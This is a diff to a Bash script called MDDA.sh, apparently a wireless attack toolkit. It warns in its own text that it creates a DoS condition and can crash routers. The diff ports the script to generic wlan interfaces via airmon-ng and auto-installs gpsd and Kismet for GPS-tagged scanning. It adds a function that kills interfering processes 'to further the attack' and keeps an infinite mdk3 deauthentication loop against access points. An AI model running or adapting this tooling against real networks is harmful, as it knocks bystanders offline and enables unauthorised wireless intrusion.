@@ -3,9 +3,29 @@
 ################################################################################################### 
 # MDDA.sh 
 # Presents Options to the user
+makeXtermLog() {
+  if [ -f $1-log.txt ];
+    then
+      rm $1-log.txt 2>/dev/null;
+  fi;
+  xterm -bc \
+    -bd white \
+    -bg black \
+    -fg green \
+    -l \
+    -lf $1-log.txt \
+    -leftbar \
+    -ls \
+    -name $1 \
+    -ms yellow \
+    -selbg orange \
+    -selfg black \
+    -title $1 \
+    -e "$2"; 
+}
 usage() { 
         clear 
-        echo -e "$0\n"
+        #echo -e "$0\n"
         echo -e "\033[31m WARNING! This script will create a DoS condition when running!\n" 
         echo -e " WARNING! Some routers have been known to fail when attacked!\n" 
         echo -e "\033[0m usage: $PROG -w -b -H [options]\n" 
@@ -21,7 +41,7 @@ usage() {
         echo "  -C   --channel           Channel to set AP up on" 
         echo "  -H   --help              Show this help message" 
         echo "" 
-        exit 0 
+        #exit 0 
 }
 ################################################################################################### 
 # Script Variables 
@@ -146,61 +166,97 @@ die() {
 ################################################################################################### 
 # Setup GPSD device
 # sets up the gps devices and requires GPSD 
-gps() { 
-    echo "Checking if gpsd is installed " 
-    if [ `locate gpsd | grep gpsd | cut -d"/" -f4` !="gpsd" ];
-      then 
-        echo "You must have Gpsd install before running this script" 
-        exit 1 
-      else 
-        echo "Ensure your streaming NMEA data from your GPS device, sleep while you check!" 
-        sleep 15 
-        echo "Plug in your USB GPS device if you have not already had, now! You have 15 seconds." 
-        sleep 15 
-        gpsd /dev/ttyUSB0 
-        #xterm 96x25+0+0 -e cat /dev/ttyUSB0 # for testing of NMEA stream, your location may differ! 
-    fi
-} 
+gps() {
+  getttyUSB=""
+  echo "Checking if gpsd is installed " 
+  if [ "`which gpsd`" == "" ];
+    then 
+      echo "You must have Gpsd install before running this script" 
+      #exit 1 
+      echo "Would you like to install Gpsd from apt-get repo? (Y/N)"
+      read getgpsd
+      if [ "`echo $getgpsd | tr [:upper:] [:lower:]`" == "y" ]; 
+        then
+          apt-get install -y gpsd
+          service gpsd stop >/dev/null
+          systemctl disable gpsd 2>/dev/null
+        else
+          echo "Manually install the application with"
+          echo "apt-get install -y gpsd"
+          #exit 1
+      fi
+  fi
+  service gpsd stop >/dev/null
+  systemctl disable gpsd 2>/dev/null
+  echo "Plug in your USB GPS device if you have not already have"
+  echo "You have 5 seconds." 
+  sleep 5
+  getttyUSB=""
+  getttyUSB=`cat /var/log/messages | tail -n50 | grep "now attached to ttyUSB" | sed -r "s/(.*)ttyUSB(.*)/ttyUSB\2/g" | tr -s " " "\n" | sort -u`
+  checkgpsd=`ps -A xf | grep -v grep | grep -i gpsd`
+  echo $checkgpsd
+  if [ "$checkgpsd" == "" ]; 
+    then
+      echo "Starting GPSD with device located at $getttyUSB"
+      gpsd -N /dev/`echo $getttyUSB` &
+  fi
+}
 ################################################################################################### 
 # Setup RFMON interface for Kismet/newcore
-# places card in monitor mode hard coded for madwifi 
-promis() { 
-    if [ `ifconfig | tr -s " " ";" | cut -d";" -f1 | tr -d "/n" | grep wifi` != "wifi0" ];
-      then 
-        echo "You must have an Atheros chipset to continue using this script!" 
-        sleep 5 
-        exit 1 
-      else 
-        airmon-ng stop ath0 
-        airmon-ng stop ath1 
-        airmon-ng stop ath2 
-        echo "Enabling first VAP now!" 
+# places card in monitor mode, uses airmon-ng to take care of the driver
+promis() {
+    ifconfig wlan0 up
+    wiface=`ifconfig | grep wlan | cut -d ":" -f1`
+    if [ "$wiface" == "" ]; then 
+      echo "You must have a wireless interface to continue using this script!" 
+      sleep 5
+    fi
+    if [ "$wiface" == "wlan0mon" ]; then
+      echo "The wireless interface $wiface is already in promiscious mode"
+    fi
+    if [ "$wiface" == "wlan0" ]; then
+        echo "Enabling first VAP on $wiface!" 
         sleep 1 
-        airmon-ng start wifi0 #enables ath0 
-    fi     
-} 
+        airmon-ng start $wiface >/dev/null
+    fi
+    proiface=`ifconfig | grep $wifacemon | cut -d":" -f1`
+}
+################################################################################################### 
+# restarts the wireless card to remove promis mode
+# brings wireless interface back up in ifconfig
+restart_interface() {
+  wiface=`ifconfig | grep wlan | cut -d ":" -f1`
+  nonmon=`echo $wiface | sed -r "s/(.*)mon/\1/g"`
+  airmon-ng stop $wiface
+  ifconfig $nonmon up
+}
+################################################################################################### 
+# Uses Airmon-ng to identify apps running which might interfer with the process
+# Kills the applications to further the attack to ensure stability
+killoff() {
+ badapps=`airmon-ng check | grep PID -A10 | grep -v PID | tr -s " " | sed -r "s/( |)([0-9]{1,5})/\2/g" | cut -d " " -f1`
+ if [ "$badapps" != "" ]; then
+    airmon-ng check kill >/dev/null
+ fi
+}
 ################################################################################################### 
 # Run Kismet 
 #runs the kismet service
 kis() { 
-    echo "Please make sure your kismet override interface and options are properly configured below before using this script!" 
-    sleep 5 
-    if [ `dpkg -l | grep kismet | tr -s " " | cut -d" " -f2 | cut -d"-" -f1 | sort -u` !="kismet" ];
+    if [ `which kismet` == "" ];
       then 
-        echo "Please make sure you have Kismet installed before using this script!" 
-        sleep 5 
-        exit 1 
-    fi 
-    if [ `cat /usr/etc/kismet.conf | grep nsource=interface` !="interface:options" ];
-      then 
-        echo "Starting Kismet-oldschool now!" 
-        sleep 3 
-        xterm 192x50+0+0 -e kismet -c madwifi_g,wifi0,madwifi & 
-      else 
-        echo "Using Kismet-newcore. " 
-        sleep 3 
-        xterm 192x50+0+0 -e kismet -c wifi0:madwifi & 
-    fi 
+        echo "Installing Kismet with apt-get repo" 
+        apt-get install -y kismet
+    fi
+    if [ "`cat /etc/kismet/kismet.conf | grep ncsource=$proiface`" != "ncsource=$proiface" ];
+      then  
+        echo "ncsource=$proiface" >> /etc/kismet/kismet.conf
+    fi
+    echo "Starting Kismet Server in background" 
+    makeXtermLog " Kismet_Server" "kismet_server 2>/dev/null" &
+    sleep 3
+    echo "Starting Kismet Client in xterm" 
+    makeXtermLog "Kismet_Client" "kismet_client 2>/dev/null" & 
 } 
 ################################################################################################### 
 # Setup and configure Airodump and Airbase-ng
@@ -248,7 +304,7 @@ mdk3() {
     fi 
         echo " MDK3 infinite loop for Blacklist creation, kill the script with <CTRL+c> " 
         sleep 1 
-    for (( ; ; )); 
+    for ((;;)); 
       do 
         touch /home/MDDA-logs/blacklist 
         mdk3 ath2 d -b /home/MDDA-logs/blacklist | tee -a /home/MDDA-logs/mdk3out.txt; 
